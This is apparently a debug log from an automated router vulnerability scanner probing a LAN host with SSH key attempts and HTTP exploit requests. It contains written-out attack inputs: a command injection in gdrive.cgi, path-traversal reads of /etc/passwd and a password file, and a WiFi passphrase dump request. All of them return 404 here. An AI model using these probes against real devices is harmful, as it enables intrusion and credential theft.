+2017-04-10 13:15:23,099 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:23,099 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:23,099 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:23,099 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:23,099 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:23,331 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:23,332 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:23,339 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:23,340 DEBUG paramiko.transport       Trying SSH key b811320998f47d9470b85c03f270a421
+2017-04-10 13:15:23,430 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:23,446 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:15:23,480 INFO paramiko.transport       Authentication (password) failed.
+2017-04-10 13:15:23,483 INFO paramiko.transport       Authentication (password) failed.
+2017-04-10 13:15:23,546 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:23,566 DEBUG paramiko.transport       starting thread (client mode): 0x302c8990L
+2017-04-10 13:15:23,566 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:23,581 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:23,584 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:23,604 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:23,616 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/dget.cgi?cmd=wifi_AP1_ssid,wifi_AP1_hidden,wifi_AP1_passphrase,wifi_AP1_passphrase_wep,wifi_AP1_security_mode,wifi_AP1_enable,get_mac_filter_list,get_mac_filter_switch,get_client_list,get_mac_address,get_wps_dev_pin,get_wps_mode,get_wps_enable,get_wps_current_time&_=1458458152703 HTTP/1.1" 404 293
+2017-04-10 13:15:23,618 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:23,629 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET / HTTP/1.1" 200 2401
+2017-04-10 13:15:23,632 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:23,639 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;echo%20$((219616-1));echo%20ffffffffffffffff; HTTP/1.1" 404 295
+2017-04-10 13:15:23,641 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:23,648 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /getcfg.php HTTP/1.1" 404 287
+2017-04-10 13:15:23,651 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:23,660 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard HTTP/1.1" 404 292
+2017-04-10 13:15:23,662 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:23,701 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:23,702 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:23,711 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:23,711 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:23,711 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:23,711 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:23,711 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:23,949 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:23,950 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:23,967 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:23,967 DEBUG paramiko.transport       Trying SSH key 27c6adf9a64d223f18b03bdf811c5745
+2017-04-10 13:15:24,089 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:24,105 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:15:24,206 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:24,249 DEBUG paramiko.transport       starting thread (client mode): 0x30253750L
+2017-04-10 13:15:24,249 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:24,334 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:24,334 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:24,342 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:24,342 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:24,342 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:24,342 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:24,342 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:24,574 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:24,575 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:24,582 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:24,583 DEBUG paramiko.transport       Trying SSH key 713ab018e26c41184e561efdd2499766
+2017-04-10 13:15:24,706 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /command.php HTTP/1.1" 404 288
+2017-04-10 13:15:24,707 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:24,742 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:15:24,842 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:24,864 DEBUG paramiko.transport       starting thread (client mode): 0x302537d0L
+2017-04-10 13:15:24,865 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:24,944 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:24,944 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:24,953 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:24,953 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:24,953 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:24,953 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:24,953 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:25,190 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:25,190 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:25,206 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:25,206 DEBUG paramiko.transport       Trying SSH key f09610b7d63838def4b4d2df5ef82d74
+2017-04-10 13:15:25,210 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:25,247 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:15:25,347 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:25,387 DEBUG paramiko.transport       starting thread (client mode): 0x302c8810L
+2017-04-10 13:15:25,388 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:25,472 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:25,472 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:25,480 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:25,480 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:25,480 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:25,480 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:25,480 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:25,710 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:25,710 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:25,714 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:25,714 DEBUG paramiko.transport       Trying SSH key 0c8949f762d298f02775ade9722c68c3
+2017-04-10 13:15:25,933 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:25,967 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:15:26,004 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:26,015 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /HNAP1/ HTTP/1.1" 404 283
+2017-04-10 13:15:26,017 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:26,029 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /bsc_lan.php HTTP/1.1" 404 288
+2017-04-10 13:15:26,030 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:26,044 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /cgi-bin/webproc HTTP/1.1" 404 292
+2017-04-10 13:15:26,068 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:26,097 DEBUG paramiko.transport       starting thread (client mode): 0x301a0b90L
+2017-04-10 13:15:26,097 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:26,182 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:26,182 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:26,190 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:26,190 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:26,190 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:26,190 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:26,190 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:26,425 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:26,425 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:26,433 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:26,433 DEBUG paramiko.transport       Trying SSH key dd3bb82e850406e9abffa80ac0046ed6
+2017-04-10 13:15:26,547 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:26,599 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:15:26,700 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:26,750 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:26,764 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET / HTTP/1.1" 200 2401
+2017-04-10 13:15:26,765 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:26,777 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd HTTP/1.1" 404 298
+2017-04-10 13:15:26,780 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:26,788 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /setSystemCommand HTTP/1.1" 404 293
+2017-04-10 13:15:26,790 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:26,800 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /hidden_info.html HTTP/1.1" 404 293
+2017-04-10 13:15:26,802 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:26,823 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /diagnostic.php HTTP/1.1" 404 291
+2017-04-10 13:15:26,825 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:26,832 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /apply.cgi HTTP/1.1" 404 286
+2017-04-10 13:15:26,834 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:26,842 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&var:language=es_es&var:page= HTTP/1.1" 404 292
